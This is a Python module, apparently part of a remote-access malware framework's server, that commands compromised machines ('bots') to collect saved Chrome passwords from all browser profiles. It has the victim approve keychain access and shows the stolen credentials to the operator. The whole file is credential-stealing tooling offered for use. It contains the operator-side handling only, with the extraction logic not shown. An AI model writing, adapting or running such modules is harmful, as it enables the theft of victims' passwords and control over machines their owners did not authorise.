# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author": ["Marten4n6"],
            "Description": "Retrieve Chrome passwords by scanning all Chrome profiles' Login Data databases.",
            "References": [
                "https://github.com/manwhoami/OSXChromeDecrypt"
            ],
            "Stoppable": False
        }

    def get_setup_messages(self):
        # The bot handles locating and iterating the profiles, no extra
        # user input is required beyond the keychain confirmation.
        return []

    def setup(self, set_options):
        confirm = self._view.should_continue([
            "This will prompt the bot to allow keychain access."
        ])

        if confirm:
            return True, None
        else:
            return False, None

    def process_response(self, response, response_options):
        str_response = self._safe_decode(response)

        self._view.output_separator()

        if not str_response.strip():
            self._view.output("No Chrome password data was returned.", "info")
            self._view.output("The bot may not have any Chrome profiles (no 'Login Data' databases found).", "info")
            return

        if "not found in keychain" in str_response.lower():
            self._view.output("Chrome keychain entry was not found:", "attention")
            self._view.output(str_response)
            return

        if "clicked deny" in str_response.lower():
            self._view.output("The user denied keychain access.", "attention")
            self._view.output(str_response)
            return

        self._view.output("Chrome passwords recovered from the bot's profiles:")
        self._view.output(str_response)

    @staticmethod
    def _safe_decode(response):
        try:
            return response.decode("utf-8")
        except UnicodeDecodeError:
            return response.decode("utf-8", errors="replace")